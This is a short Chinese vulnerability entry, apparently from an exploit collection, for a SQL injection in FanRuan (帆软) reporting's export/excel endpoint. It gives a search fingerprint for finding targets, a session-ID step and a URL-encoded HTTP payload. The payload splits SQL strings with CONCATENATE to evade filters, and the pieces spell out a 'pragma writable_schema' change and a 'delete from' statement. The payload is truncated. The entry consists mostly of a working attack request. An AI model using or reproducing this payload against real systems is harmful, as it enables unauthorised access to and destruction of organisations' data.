# 帆软报表前台exportexcel存在SQL注入漏洞

- **系统**：帆软　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title="数据决策系统"`
- **请求**：`GET /webroot/ReportServer HTTP/2`
- **关键头**：`Viewlets: [{'reportlet':'/'}]`　`Op: getSessionID`

**请求体 / payload**
```
GET /webroot/decision/nx/report/v9/largedataset/export/excel?functionParams=%7B%7D&__parameters__=%7B%7D HTTP/2
Host:
Sessionid: 填写第一步获取到的seesionID
Params: %3Cpd%3E%0A+%3CLargeDatasetExcelExportJS+dsName%3D%221%22%3E%0A%3CParameters%3E%3CParameter%3E%0A%3CAttributes+name%3D%22c%22%2F%3E%3CO+t%3D%22Formula%22%3E%3CAttributes%3E%3C%21%5BCDATA%5Bsql%28%27FRDemo%27%2CCONCATENATE%28%22pr%22%2C%22agm%22%2C%22a+wr%22%2C%22i%22%2C%22t%22%2C%22a%22%2C%22ble%22%2C%22_sch%22%2C%22e%22%2C%22ma%3Do%22%2C%22n%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22dele%22%2C%22t%22%2C%22e+f%22%2C%22r%22%2C%22o%2…（脚本共 2068 字，完整版见原文）
```
- **预期**：200　|　—